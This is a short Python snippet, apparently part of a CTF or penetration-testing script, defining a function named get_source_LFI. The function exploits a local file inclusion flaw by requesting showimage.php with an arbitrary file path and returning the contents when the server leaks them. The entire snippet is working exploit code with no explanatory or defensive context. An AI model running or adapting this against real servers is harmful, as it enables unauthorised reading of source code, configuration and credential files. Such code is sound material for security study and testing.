import requests

def get_source_LFI(base_url, fullFilePath):
    r = requests.get(f'{base_url}/showimage.php?file={fullFilePath}')
    if r.status_code != 200 or 'failed to open stream: No such file or directory in' in r.text:
        return False, None
    
    return True, r.text.strip()
